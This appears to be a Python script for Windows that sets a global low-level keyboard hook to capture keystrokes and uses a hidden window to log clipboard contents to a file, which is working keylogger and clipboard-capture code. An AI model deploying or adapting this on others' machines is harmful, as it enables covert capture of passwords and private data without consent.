from ctypes import *
from ctypes.wintypes import *
import time
import threading
import sys
import re
import string
import states
kernel32 = WinDLL('kernel32', use_last_error=True)
user32 = WinDLL('user32', use_last_error=True)
WH_KEYBOARD_LL = 13
WH_CALLWNDPROC = 4
WM_KEYDOWN = 0x0100 #256
WM_CLIPBOARDUPDATE = 0x031D
ULONG_PTR = WPARAM
LRESULT = LPARAM
#Initialize Context & States
context = states.Context()
context.set_state('defaultstate')
#Keyboard
#
#Dict Function Factory
LowLevelKeyboardProc = WINFUNCTYPE(LRESULT, c_int, WPARAM, LPARAM)
alphanumeric = [c for c in string.digits + string.ascii_uppercase]
#this strucepresents what's returend in the lParam
class KBDLLHOOKSTRUCT(Structure):
	_fields_ = (('vkCode', DWORD), ('scanCode', DWORD), ('flags', DWORD), ('time', DWORD), ('dwExtraInfo', ULONG_PTR))
@LowLevelKeyboardProc
def keyboard_low_level(nCode, wParam, lParam):
	msg = cast(lParam, POINTER(KBDLLHOOKSTRUCT))[0]
	vk_code = msg.vkCode
	character = chr(vk_code)
	#if alphanumeric, and only proceed if pressing down, not both up & down for duplicates
	if character in alphanumeric and wParam == WM_KEYDOWN:
		character = character.lower()
		context.process_keystroke(character)
		#leave if "e"
		if character == 'e':
			sys.exit(0)
	return user32.CallNextHookEx(None, nCode, wParam, lParam)
def get_clipboard_text():
	user32.OpenClipboard(c_int(0))
	#get clipboard text
	clipboard_text = c_char_p(user32.GetClipboardData(c_int(1))).value
	if clipboard_text is not None:
		clipboard_text = clipboard_text.decode('utf-8')
	else:
		print("Error in retrieving clipboard")
	user32.CloseClipboard()
	return clipboard_text
#Captures clipboard inputs when it changes. If it weren't a headless window, this would be recording window movements & close buttons & so forth
def wnd_proc(hwnd, msg, wParam, lParam):
	if msg == WM_CLIPBOARDUPDATE:
		context.save_to_file(get_clipboard_text())
	return user32.DefWindowProcW(hwnd, msg, wParam, lParam)
if __name__ == '__main__':
	#
	#ONE LINE SETS UP KEYBOARD HOOK
	#
	#and because it is WH_KEYBOARD_LL, it doesn't require an external DLL injected into it, unlike WH_KEYBOARD & WH_CALLWNDFUNC
	#
	kHook = user32.SetWindowsHookExW(WH_KEYBOARD_LL, keyboard_low_level, None, 0)
	#
	#Creating a dummy window with the only SOLE purpose of recording clipboard changes
	#
	WNDPROCTYPE = WINFUNCTYPE(c_int, HWND, c_uint, WPARAM, LPARAM)
	class WNDCLASSEX(Structure):
		_fields_ = [("cbSize", c_uint),
					("style", c_uint),
					("lpfnWndProc", WNDPROCTYPE),
					("cbClsExtra", c_int),
					("cbWndExtra", c_int),
					("hInstance", HANDLE),
					("hIcon", HANDLE),
					("hCursor", HANDLE),
					("hBrush", HANDLE),
					("lpszMenuName", LPCWSTR),
					("lpszClassName", LPCWSTR),
					("hIconSm", HANDLE)]
	wclassName = u'Dummy'
	wndClass = WNDCLASSEX()
	wndClass.cbSize = sizeof(WNDCLASSEX)
	wndClass.lpfnWndProc = WNDPROCTYPE(wnd_proc)
	wndClass.lpszClassName = wclassName
	#
	#Registering class called wndClass (containing class name) is necessary for Classname to work with CreateWindowExW.
	#
	user32.RegisterClassExW(byref(wndClass))
	#Headless dummy window
	hwnd_dummy = user32.CreateWindowExW(0, wclassName, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
	#apply clipboard listening to the headless window
	#If we were makign a real window, we use the ShowWindow & maybe the Update Window Function
	user32.AddClipboardFormatListener(hwnd_dummy)
	msg = MSG()
	lpmsg = pointer(msg)
	
	#Utilize display
	# print_banner()r32321
	while user32.GetMessageW(lpmsg, 0, 0, 0) != 0:
		user32.TranslateMessage(lpmsg)
		user32.DispatchMessageW(lpmsg)